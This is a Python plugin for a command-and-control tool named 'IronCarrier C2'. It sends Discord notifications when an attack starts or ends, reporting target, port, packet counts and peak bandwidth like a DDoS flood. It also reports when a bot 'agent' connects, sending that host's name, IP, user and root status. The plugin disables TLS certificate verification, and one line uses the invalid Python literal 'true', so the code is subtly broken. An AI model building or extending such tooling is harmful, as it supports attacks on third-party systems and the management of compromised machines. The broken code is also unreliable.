#!/usr/bin/env python3
"""
Discord Webhook Plugin
Sends rich embed notifications to Discord channel
"""

import json
import ssl
import urllib.request
from typing import Dict, Any, Optional
from datetime import datetime

import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../..'))

from plugins.api import PluginInterface, PluginMetadata, PluginContext, PluginConfig


class DiscordWebhook(PluginInterface):
    """Discord webhook notification plugin"""
    
    def __init__(self):
        self.config = None
        self.context = None
        self._webhook_url = ''
        self._username = 'IronCarrier C2'
        self._avatar_url = ''
        self._enabled = True
        self._color_attack = 15158332      # Red
        self._color_agent = 3066993        # Green
        self._color_error = 15844367       # Orange
    
    def get_metadata(self) -> PluginMetadata:
        return PluginMetadata(
            name='discord_webhook',
            version='1.0.0',
            description='Send rich embed notifications to Discord',
            author='IronCarrier',
            tags=['notifications', 'discord', 'alerts', 'webhook'],
            priority=10,
        )
    
    def on_load(self, context: PluginContext) -> None:
        self.context = context
        self.config = PluginConfig('discord_webhook')
        self.config.set_default('webhook_url', '')
        self.config.set_default('username', 'IronCarrier C2')
        self.config.set_default('avatar_url', '')
        self.config.set_default('enabled', True)
        self.config.set_default('color_attack', 15158332)
        self.config.set_default('color_agent', 3066993)
        self.config.set_default('color_error', 15844367)
        
        if context.config and 'discord_webhook' in context.config:
            self.config.load(context.config['discord_webhook'])
        
        self._webhook_url = self.config.get('webhook_url', '')
        self._username = self.config.get('username', 'IronCarrier C2')
        self._avatar_url = self.config.get('avatar_url', '')
        self._enabled = self.config.get('enabled', True)
        self._color_attack = self.config.get('color_attack', 15158332)
        self._color_agent = self.config.get('color_agent', 3066993)
        self._color_error = self.config.get('color_error', 15844367)
    
    def on_unload(self) -> None:
        pass
    
    def _send(self, embeds: list) -> bool:
        if not self._enabled or not self._webhook_url:
            return False
        
        try:
            payload = {
                'username': self._username,
                'avatar_url': self._avatar_url,
                'embeds': embeds,
            }
            
            data = json.dumps(payload).encode()
            req = urllib.request.Request(
                self._webhook_url,
                data=data,
                method='POST',
                headers={'Content-Type': 'application/json'}
            )
            
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            
            with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
                result = json.loads(resp.read().decode())
                return resp.status == 204
        except Exception as e:
            if self.context:
                self.context.log('error', f"Discord webhook failed: {e}")
            return False
    
    def _make_embed(self, title: str, color: int, fields: list = None,
                    description: str = '', footer: str = '') -> Dict:
        embed = {
            'title': title,
            'color': color,
            'timestamp': datetime.utcnow().isoformat(),
        }
        
        if description:
            embed['description'] = description
        if fields:
            embed['fields'] = fields
        if footer:
            embed['footer'] = {'text': footer}
        
        return embed
    
    def on_attack_start(self, job: Any) -> None:
        target = getattr(job, 'target', job.get('target', '?') if isinstance(job, dict) else '?')
        vector = getattr(job, 'vector', job.get('vector', '?') if isinstance(job, dict) else '?')
        port = getattr(job, 'port', job.get('port', '?') if isinstance(job, dict) else '?')
        duration = getattr(job, 'duration', job.get('duration', '?') if isinstance(job, dict) else '?')
        
        embed = self._make_embed(
            title='⚡ Attack Started',
            color=self._color_attack,
            fields=[
                {'name': 'Vector', 'value': f"`{vector}`", 'inline': True},
                {'name': 'Target', 'value': f"`{target}:{port}`", 'inline': True},
                {'name': 'Duration', 'value': f"{duration}s", 'inline': True},
            ],
            footer='IronCarrier C2'
        )
        
        self._send([embed])
    
    def on_attack_end(self, stats: Dict) -> None:
        embed = self._make_embed(
            title='✅ Attack Completed',
            color=self._color_agent,
            fields=[
                {'name': 'Packets', 'value': f"{stats.get('total_packets', 0):,}", 'inline': True},
                {'name': 'Data', 'value': f"{stats.get('total_megabytes', 0):.2f} MB", 'inline': True},
                {'name': 'Peak PPS', 'value': f"{stats.get('peak_pps', 0):,.0f}", 'inline': True},
                {'name': 'Peak BW', 'value': f"{stats.get('peak_mbps', 0):.2f} Mbps", 'inline': True},
                {'name': 'Errors', 'value': str(stats.get('total_errors', 0)), 'inline': True},
            ],
            footer='IronCarrier C2'
        )
        
        self._send([embed])
    
    def on_agent_connect(self, agent: Any) -> None:
        agent_id = getattr(agent, 'agent_id', agent.get('agent_id', '?') if isinstance(agent, dict) else '?')
        hostname = getattr(agent, 'hostname', agent.get('hostname', '?') if isinstance(agent, dict) else '?')
        ip = getattr(agent, 'ip', agent.get('ip', '?') if isinstance(agent, dict) else '?')
        os_name = getattr(agent, 'os_name', agent.get('os', '?') if isinstance(agent, dict) else '?')
        user = getattr(agent, 'username', agent.get('user', '?') if isinstance(agent, dict) else '?')
        privs = getattr(agent, 'privileges', agent.get('privileges', '?') if isinstance(agent, dict) else '?')
        
        priv_label = "ROOT" if privs == 'root' else "USER"
        
        embed = self._make_embed(
            title=f"👤 Agent Connected [{priv_label}]",
            color=self._color_agent,
            fields=[
                {'name': 'ID', 'value': f"`{str(agent_id)[:20]}`", 'inline': False},
                {'name': 'Host', 'value': hostname, 'inline': True},
                {'name': 'IP', 'value': f"`{ip}`", 'inline': true},
                {'name': 'OS', 'value': os_name, 'inline': True},
                {'name': 'User', 'value': user, 'inline': True},
            ],
            footer='IronCarrier C2'
        )
        
        self._send([embed])
    
    def on_agent_disconnect(self, agent_id: str) -> None:
        embed = self._make_embed(
            title='❌ Agent Disconnected',
            color=15844367,
            description=f"`{agent_id}`",
            footer='IronCarrier C2'
        )
        self._send([embed])
    
    def on_error(self, error: Exception) -> None:
        embed = self._make_embed(
            title='⚠️ Error',
            color=self._color_error,
            description=f"```\n{str(error)[:500]}\n```",
            footer='IronCarrier C2'
        )
        self._send([embed])
    
    def get_config(self) -> Dict:
        return self.config.to_dict() if self.config else {}
    
    def set_config(self, config: Dict) -> None:
        if self.config:
            self.config.load(config)
            self._webhook_url = self.config.get('webhook_url', '')


plugin = DiscordWebhook()
